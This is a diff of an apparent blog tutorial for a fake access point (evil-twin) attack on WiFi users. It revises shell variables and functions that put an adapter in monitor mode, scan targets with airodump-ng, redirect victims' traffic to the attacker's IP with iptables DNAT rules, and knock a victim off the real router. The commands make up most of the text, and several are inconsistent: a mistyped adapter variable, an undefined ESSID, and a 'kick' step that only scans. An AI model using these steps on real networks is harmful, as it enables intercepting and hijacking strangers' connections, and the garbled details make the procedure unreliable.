@@ -65,15 +65,27 @@ Our fake router can allow up to 253 connections. If you would like to understand
 Start by creating the following environment variables. There is a difference between BSSID and ESSID. BSSID is the Mac address and ESSID is the conventional SSID or router name.
 
 {% highlight ruby %}
-targetBSSID="";
-gatewayBSSID="";
-gatewayESSID="";
-ch="";
+#SSID Varibles
+
+ethBSSID="$(ifconfig | grep ether | awk '{print $2}' | sed -n 1p)";
+wifiBSSID="$(ifconfig | grep ether | awk '{print $2}' | sed -n 2p)";
+
+#Set myBSSID to either $ethBSSID or $wifiBSSID depending on what you want to use
+
+myBSSID=$wifiBSSID;
+myESSID=$wifiESSID;
+
+#Gateway SSID Varibles
+
+gatewayBSSID="$(arp -n | awk '{print $3}' | sed -n 2p)";
+gatewayESSID="$(nmcli -t -f active,ssid dev wifi | egrep '^yes' | tr -d 'yes:')";
+
+#WiFi Power Varibles
+
+ch="6";
 wpower="27";
-#wpower is the amount of energy we want to give the WiFi adapter to increase it's signal strength. Legal limit is 27.
-#I am not liable if you decide to go above the legal limit.
-wifi="$(ifconfig | grep flags | awk '{print $1}' | sed -n 3p | tr -d ':')";
-#If you are not using a virtual machine, you will not need the $wifi varible. If you are using Kali as a native system, then replace $wifi with $adp
+#Warning: The legal limit in the US is 27
+
 {% endhighlight %}
 
 By default, a router is placed into promiscuous mode. We need to switch it to monitor mode. Promiscuous mode is “normal” people WiFi mode. Think of promiscuous mode as a dumb beacon or an antenna. All it does is take in traffic as it comes and spits out what you tell it to. You won’t be able to access the internet because it requires a complicated series of handshakes. Monitor mode will simply accept everything.
@@ -83,11 +95,11 @@ function mon ()
 {
 sudo sysctl -w net.ipv4.ip_forward=1;
 sudo systemctl start apache2;
-sudo ifconfig $wifi down;
-sudo ifconfig $wifi mode monitor;
-sudo ifconfig $wifi up;
+sudo ifconfig $adp down;
+sudo ifconfig $adp mode monitor;
+sudo ifconfig $adp up;
 sudo airmon-ng check;
-sudo airmon-ng start $wifi;
+sudo airmon-ng start $adp;
 }
 {% endhighlight %}
 
@@ -96,13 +108,13 @@ Once we place the WiFi adapter in monitor mode, we will need to see what the BSS
 {% highlight ruby %}
 function dump ()
 {
-sudo airodump-ng $wifi;
+sudo airodump-ng $atp;
 }
 {% endhighlight %}
 
 Now we need to create a new adapter to tunnel out traffic to and we need to include a series of firewall rules to redirect our traffic. Explaining these rules will require an entire tutorial series on their own. For now, just copy and paste them
 
-Note: The environment variable will not pass in the destination argument. Replace 192.168.1.4 with your own IP.
+Note: The environment variable will not pass in the destination argument.
 
 {% highlight ruby %}
 function route ()
@@ -121,7 +133,7 @@ sudo iptables --table nat --append POSTROUTING --out-interface $adp -j MASQUERAD
 
 sudo iptables --append FORWARD --in-interface at0 -j ACCEPT;
 
-sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.4:80;
+sudo iptables -t nat -A PREROUTING -p tcp --dport $lport -j DNAT --to-destination $myIP:$lport;
 
 sudo iptables -t nat -A POSTROUTING -j MASQUERADE;
 }
@@ -146,7 +158,7 @@ And finally, we need to add in code to knock our victim off the router and have 
 {% highlight ruby %}
 function kick ()
 {
-sudo airodump-ng $wifi;
+sudo airodump-ng $adp;
 }
 {% endhighlight %}
 
@@ -201,10 +213,12 @@ Target BSSID
 
 ![image tooltip](/blog/images/beef/et_dump.JPG)
 
-We need to go back to our new environment variables in the .bashrc file and fill in what we just learned.
+We need to go back to our terminal and set the new environment variables and fill in what we just learned.
 
 {% highlight ruby %}
-nano .bashrc
+targetBSSID="Targe host BSSID goes here";
+gatewayBSSID="Targe router gateway BSSID goes here";
+gatewayESSID="Targe router gateway BSSID goes here";
 {% endhighlight %}
 
 Open a new tab and create the base router
